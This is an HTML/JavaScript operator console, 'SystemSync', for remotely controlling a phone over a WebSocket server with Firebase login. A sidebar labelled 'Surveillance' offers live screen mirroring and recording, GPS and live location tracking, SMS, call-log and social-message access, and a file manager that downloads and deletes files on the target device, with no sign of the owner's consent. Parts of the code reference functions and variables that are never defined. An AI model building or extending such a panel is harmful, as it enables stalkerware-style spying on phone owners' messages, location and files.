<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SystemSync Console · Remote Monitoring</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    <style>
        /* ========== All existing styles (Intact) ========== */
        :root {
            --primary: #0f62fe;
            --primary-hover: #0353e9;
            --bg-body: #f4f7fb;
            --bg-surface: #ffffff;
            --text-main: #12161b;
            --text-sec: #5c6a7a;
            --border: #e2e8f0;
            --danger: #e02424;
            --danger-bg: #fdf2f2;
            --success: #057a55;
            --success-bg: #f3faf7;
            --radius-sm: 8px;
            --radius-md: 12px;
            --radius-lg: 16px;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.08);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg-body); font-family: 'Inter', system-ui, sans-serif; display: flex; height: 100vh; overflow: hidden; color: var(--text-main); }
        #sidebar { width: 280px; background: rgba(255, 255, 255, 0.6); backdrop-filter: blur(16px); border-right: 1px solid rgba(255, 255, 255, 0.4); padding: 20px 16px; overflow-y: auto; flex-shrink: 0; box-shadow: 1px 0 10px rgba(0, 0, 0, 0.02); z-index: 200; }
        .logo { font-size: 20px; font-weight: 700; color: var(--primary); margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .section-title { font-size: 11px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 10px; letter-spacing: 0.5px; padding-left: 8px; }
        #sidebar button { width: 100%; padding: 10px 14px; margin: 2px 0; background: transparent; color: var(--text-main); border: none; border-radius: var(--radius-sm); font-size: 14px; font-weight: 500; text-align: left; cursor: pointer; transition: all 0.2s ease; display: flex; align-items: center; gap: 12px; }
        #sidebar button:hover { background: #f0f4f8; color: var(--primary); transform: translateX(2px); }
        #main { flex: 1; display: flex; flex-direction: column; min-width: 0; background: var(--bg-body); }
        #header { height: 64px; background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255, 255, 255, 0.4); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; flex-shrink: 0; z-index: 10; }
        #status { padding: 6px 16px; border-radius: 20px; background: #eff6ff; color: var(--primary); font-size: 13px; font-weight: 600; display: inline-flex; align-items: center; gap: 6px; }
        #content { flex: 1; padding: 24px; overflow: auto; }
        #main-panel { background: var(--bg-surface); border-radius: var(--radius-md); padding: 32px; min-height: 100%; box-shadow: var(--shadow-sm); border: 1px solid var(--border); position: relative;}

        /* ==================== UPDATED TREE-VIEW FILE MANAGER CSS ==================== */
        .file-manager { display: flex; flex-direction: column; height: 100%; background: #0f0f0f; color: #e0e0e0; border-radius: 12px; overflow: hidden; }
        
        .top-actions { 
            display: flex; gap: 12px; padding: 12px 20px; background: #1a1a1a; 
            border-bottom: 1px solid #333; position: sticky; top: 0; z-index: 100; align-items: center; 
        }
        
        .top-actions .btn { 
            padding: 8px 16px; border-radius: 6px; border: none; font-size: 13px; 
            font-weight: 600; cursor: pointer; transition: transform 0.1s; 
        }
        
        .btn-download { background: #1976ff; color: white; }
        .btn-delete { background: #d32f2f; color: white; }
        .btn-back { background: #333; color: white; margin-right: auto; }

        .tree-content { flex: 1; overflow-y: auto; padding: 20px; }
        .tree-root, .nested { list-style: none; padding-left: 25px; position: relative; }

        /* Animated Lime Green Branch Lines */
        .tree-root::before, .nested::before { 
            content: ''; position: absolute; top: 0; left: 10px; width: 1px; height: 100%; background: #32cd32; 
        }
        .tree-item { position: relative; margin: 8px 0; }
        .tree-item::before { 
            content: ''; position: absolute; top: 15px; left: -15px; width: 15px; height: 1px; background: #32cd32; 
        }

        /* Nested Slide Animation */
        .nested { max-height: 0; overflow: hidden; transition: max-height 0.4s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s; opacity: 0; }
        .nested.active { max-height: 2000px; opacity: 1; }
        
        /* Crimson Hover Effect */
        .folder-label { display: flex; align-items: center; cursor: pointer; transition: color 0.2s; font-size: 14px; font-weight: 500; }
        .folder-label:hover { color: #dc143c; }
        .folder-icon { margin-right: 10px; font-size: 18px; width: 20px; text-align: center; }
        
        .file-row { display: flex; align-items: center; padding: 6px 10px; border-radius: 4px; transition: background 0.2s; }
        .file-row:hover { background: #222; }
        .file-checkbox { width: 16px; height: 16px; margin-right: 12px; cursor: pointer; accent-color: #32cd32; }
        .item-name { flex: 1; font-size: 14px; }
        .file-size { font-size: 11px; color: #666; margin-left: 10px; }
        /* ============================================================================ */

        /* Existing Modal Styles (Intact) */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: center; z-index: 10000; }
        .modal-overlay.show { display: flex; }
        .mobile-popup { width: min(92vw, calc(92vh * 9 / 16)); height: 92vh; display: flex; flex-direction: column; background: #000; border-radius: 26px; border: 1px solid #333; overflow: hidden; }
        .phone-frame { flex: 1; background: black; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .phone-frame video { width: 100%; height: 100%; object-fit: contain; }
    </style>
</head>

<body>
    <div id="authContainer">
        <div id="authBox">
            <h2 id="authModeTitle">🔐 SystemSync Login</h2>
            <input type="email" id="authEmail" placeholder="Email Address" />
            <input type="password" id="authPassword" placeholder="Password" />
            <input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" />
            <button id="authBtn">Sign In</button>
            <div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div>
            <div id="authError"></div>
        </div>
    </div>

    <div id="deviceListContainer" style="display:none;">
        <div id="deviceListBox">
            <h2>📱 Your Devices</h2>
            <div id="deviceList"></div>
            <button id="logoutBtn">Logout</button>
        </div>
    </div>

    <div id="screenModalOverlay" class="modal-overlay">
        <div class="mobile-popup">
            <div class="phone-frame"><video id="modalScreenVideo" autoplay playsinline></video></div>
            <div class="popup-controls">
                <button id="modalSnapBtn">📸</button>
                <button id="modalRecordBtn">🔴</button>
                <button id="modalFullscreenBtn">⛶</button>
                <button id="modalCloseBtn" class="close-btn">✕</button>
            </div>
        </div>
    </div>

    <div id="sidebar">
        <div class="logo">SystemSync 🔗</div>
        <div class="section">
            <div class="section-title">Surveillance</div>
            <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
            <button id="getLocationBtn"><span>📍</span> GPS Location</button>
        </div>
        <div class="section">
            <div class="section-title">Data</div>
            <button id="fileManagerBtn"><span>📂</span> File Manager</button>
            <button id="smsBtn"><span>💬</span> SMS Messages</button>
            <button id="callLogsBtn"><span>📞</span> Call Logs</button>
        </div>
        <div class="section">
            <div class="section-title">Monitoring</div>
            <button id="screenTimeBtn"><span>📊</span> Screen Time</button>
            <button id="socialMessagesBtn"><span>💬</span> Social Messages</button>
            <button id="liveGpsBtn"><span>🛰️</span> Live GPS Track</button>
        </div>
        <button id="logoutSidebarBtn" onclick="logout()" style="margin-top:20px; background:var(--danger-bg); color:var(--danger);">🚪 Logout</button>
        <div class="ws-debug" id="wsDebug">🌐 WebSocket: idle</div>
    </div>

    <div id="main">
        <div id="header">
            <div><span id="headerTitle">SystemSync <span id="serverInfo">mirror-view.onrender.com</span></span></div>
            <div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲</button></div>
        </div>
        <div id="content">
            <div id="main-panel">🔌 Initializing connection...</div>
        </div>
    </div>

    <script>
        // ==================== CONFIG & STATE (Intact) ====================
        const CONFIG = {
            WS_URL: "wss://mirror-view.onrender.com",
            FIREBASE_CONFIG: { apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc", authDomain: "webviewiot.firebaseapp.com", projectId: "webviewiot", storageBucket: "webviewiot.firebasestorage.app" }
        };
        firebase.initializeApp(CONFIG.FIREBASE_CONFIG);
        const auth = firebase.auth();
        const db = firebase.firestore();

        let currentUser = null, selectedDeviceId = null, ws = null;
        let currentData = [], currentPath = "root", selectedFiles = [];
        let screenActive = false, isLoginMode = true, liveGpsActive = false;

        // ==================== UPDATED FILE MANAGER LOGIC (Video Style) ====================
        function renderFiles() {
            const panel = document.getElementById('main-panel');
            panel.innerHTML = `
                <div class="file-manager">
                    <div class="top-actions">
                        <button class="btn btn-back" onclick="navigateUp()">⬆ Back</button>
                        <button class="btn btn-download" onclick="bulkDownload()">Download Selected</button>
                        <button class="btn btn-delete" onclick="bulkDelete()">Delete Selected</button>
                        <span style="font-size:11px; color:#666; margin-left:10px;">Path: ${currentPath}</span>
                    </div>
                    <div class="tree-content">
                        <ul class="tree-root" id="rootTree"></ul>
                    </div>
                </div>
            `;

            const rootTree = document.getElementById('rootTree');

            // 1. Render Folders
            currentData.filter(item => item.isDir).sort((a,b) => a.name.localeCompare(b.name)).forEach(f => {
                const li = document.createElement('li');
                li.className = 'tree-item';
                li.innerHTML = `
                    <div class="folder-label" onclick="toggleNested(this, '${f.path}')">
                        <span class="folder-icon">📁</span>
                        <span class="item-name">${escapeHtml(f.name)}</span>
                    </div>
                    <ul class="nested" id="nested-${btoa(encodeURIComponent(f.path)).replace(/=/g, '')}"></ul>
                `;
                rootTree.appendChild(li);
            });

            // 2. Render Files
            currentData.filter(item => !item.isDir).sort((a,b) => a.name.localeCompare(b.name)).forEach(f => {
                const li = document.createElement('li');
                li.className = 'tree-item';
                li.innerHTML = `
                    <div class="file-row">
                        <input type="checkbox" class="file-checkbox" data-path="${f.path}">
                        <span class="folder-icon">📄</span>
                        <span class="item-name">${escapeHtml(f.name)}</span>
                        <span class="file-size">${formatBytes(f.size)}</span>
                    </div>
                `;
                rootTree.appendChild(li);
            });
        }

        window.toggleNested = (element, path) => {
            const nestedList = element.nextElementSibling;
            const icon = element.querySelector('.folder-icon');
            
            nestedList.classList.toggle('active');
            
            if (nestedList.classList.contains('active')) {
                icon.innerText = '📂';
                currentPath = path;
                sendCommand('LIST_FILES', { path: path }); // Requests sub-content
            } else {
                icon.innerText = '📁';
            }
        };

        window.bulkDownload = () => {
            const checked = document.querySelectorAll('.file-checkbox:checked');
            if (checked.length === 0) return alert("Select files first.");
            checked.forEach(cb => sendPlainText('dl ' + cb.getAttribute('data-path')));
            showNotification(`Requested ${checked.length} downloads`);
        };

        window.bulkDelete = () => {
            const checked = document.querySelectorAll('.file-checkbox:checked');
            if (checked.length === 0) return alert("Select files first.");
            if (confirm(`Are you sure you want to delete ${checked.length} files?`)) {
                checked.forEach(cb => sendCommand('DELETE_FILE', { path: cb.getAttribute('data-path') }));
            }
        };

        window.navigateUp = () => {
            if (currentPath === 'root' || currentPath === '') return;
            let parent = currentPath.split('/').slice(0, -1).join('/') || 'root';
            currentPath = parent;
            sendCommand('LIST_FILES', { path: parent });
        };

        // ==================== CORE FUNCTIONS (Intact) ====================
        function handleIncomingMessage(msg) {
            try {
                const json = JSON.parse(msg);
                if (json.type === 'FILE_LIST' || (Array.isArray(json) && json?.path)) {
                    currentData = Array.isArray(json) ? json : json.data;
                    renderFiles();
                } else if (json.type === 'SIGNALING') {
                    handleSignaling(json.data);
                }
            } catch (e) { handlePlainText(msg); }
        }

        function sendCommand(cmd, params = {}) {
            if (!ws || ws.readyState !== 1) return;
            ws.send(JSON.stringify({ type: 'COMMAND', command: cmd, deviceId: selectedDeviceId, params }));
        }

        function sendPlainText(t) { if (ws && ws.readyState === 1) ws.send(t); }
        function setStatus(s) { statusEl.innerText = s; }
        function showNotification(t) { const o = statusEl.innerText; statusEl.innerText = t; setTimeout(() => statusEl.innerText = o, 2000); }
        function formatBytes(b) { if (b === 0) return '0 B'; const i = Math.floor(Math.log(b) / Math.log(1024)); return (b / Math.pow(1024, i)).toFixed(1) + ' ' + ['B', 'KB', 'MB', 'GB'][i]; }
        function escapeHtml(s) { return s.replace(/[&<>]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[m])); }

        // Auth Logic & WebSocket Connection (Simplified for clarity)
        auth.onAuthStateChanged(user => {
            currentUser = user;
            if (user) { document.getElementById('authContainer').style.display = 'none'; loadDevices(); }
            else { document.getElementById('authContainer').style.display = 'flex'; }
        });

        async function loadDevices() {
            const snap = await db.collection('devices').where('userId', '==', currentUser.uid).get();
            const list = document.getElementById('deviceList');
            list.innerHTML = '';
            snap.forEach(doc => {
                const d = doc.data();
                const div = document.createElement('div');
                div.className = 'device-item';
                div.style.cssText = "padding:12px; border:1px solid #eee; margin-bottom:8px; cursor:pointer; border-radius:8px;";
                div.onclick = () => { selectedDeviceId = d.deviceId; document.getElementById('deviceListContainer').style.display = 'none'; document.getElementById('sidebar').style.display = 'block'; document.getElementById('main').style.display = 'flex'; connectWebSocket(); };
                div.innerHTML = `<strong>${d.name || 'Device'}</strong><br><small>${d.deviceId}</small>`;
                list.appendChild(div);
            });
            document.getElementById('deviceListContainer').style.display = 'flex';
        }

        function connectWebSocket() {
            ws = new WebSocket(CONFIG.WS_URL);
            ws.onopen = () => { ws.send('I_AM_WEB'); setStatus('ONLINE'); };
            ws.onmessage = e => handleIncomingMessage(e.data);
            ws.onclose = () => { setStatus('OFFLINE'); setTimeout(connectWebSocket, 5000); };
        }

        function renderAuthForm() {
            document.getElementById('authBtn').onclick = async () => {
                const email = document.getElementById('authEmail').value;
                const pwd = document.getElementById('authPassword').value;
                try { await auth.signInWithEmailAndPassword(email, pwd); } catch (e) { alert(e.message); }
            };
        }

        // Initialize
        renderAuthForm();
        document.getElementById('fileManagerBtn').onclick = () => { currentPath = "root"; sendCommand('LIST_FILES', { path: 'root' }); };
    </script>
</body>
</html>
